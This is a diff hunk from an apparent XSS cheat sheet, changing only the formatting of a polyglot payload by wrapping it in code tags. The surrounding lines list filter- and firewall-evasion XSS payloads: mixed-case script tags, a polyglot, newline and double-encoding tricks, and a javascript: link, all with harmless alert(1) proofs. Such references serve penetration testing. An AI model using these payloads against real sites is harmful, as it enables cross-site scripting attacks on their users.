@@ -35,8 +35,8 @@ Remove . from all payloads
 <.ScRiPt>alert(1)<./ScRiPt><br>
 < and > can be replace with html entities &lt; and &gt; <br>
 You can try an XSS polyglot <br>
-javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> <br>
-https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626 <br>
+<code>javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> <br>
+ https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626 </code><br>
 Try New Lines to break the firewall - newline URL encoded is %0 - <.script>%0alert(1)</script> - try with different HTML tags <br>
 Try double encoding a newline break %2522 <br> 
 New Line breaks often work on <.a/href=%2522javascript:alert(1)> <br>
